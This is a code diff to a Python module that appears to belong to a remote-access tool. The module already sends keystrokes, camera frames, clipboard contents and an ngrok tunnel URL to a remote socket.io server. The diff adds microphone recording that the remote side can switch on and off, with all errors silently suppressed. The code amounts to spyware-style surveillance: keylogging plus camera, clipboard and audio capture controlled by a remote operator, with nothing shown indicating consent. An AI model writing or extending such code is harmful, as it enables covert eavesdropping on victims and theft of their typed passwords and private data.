@@ -18,14 +18,16 @@ _sio = None
 _controller = None
 _recorder = None
 _camera = None
+_mic = None
 _lock = threading.Lock()
 
 
-def init(controller_fn, recorder, camera):
-    global _controller, _recorder, _camera
+def init(controller_fn, recorder, camera, mic=None):
+    global _controller, _recorder, _camera, _mic
     _controller = controller_fn
     _recorder = recorder
     _camera = camera
+    _mic = mic
 
 
 def _emit(event, data):
@@ -41,6 +43,7 @@ def broadcast_key(char):       _emit("key",          {"char": char})
 def broadcast_camera(b64):     _emit("camera_frame", {"data": b64})
 def broadcast_clipboard(text): _emit("clipboard",    {"text": text})
 def broadcast_ngrok_url(url):  _emit("ngrok_url",    {"url": url})
+def broadcast_audio(b64):      _emit("audio",        {"data": b64})
 
 
 def _connect_loop():
@@ -96,6 +99,18 @@ def _connect_loop():
     def _on_cam_off(_data=None):
         if _camera:
             try: _camera.stop()
+            except Exception: pass
+
+    @sio.on("mic_on")
+    def _on_mic_on(_data=None):
+        if _mic:
+            try: _mic.start()
+            except Exception: pass
+
+    @sio.on("mic_off")
+    def _on_mic_off(_data=None):
+        if _mic:
+            try: _mic.stop()
             except Exception: pass
 
     while True:
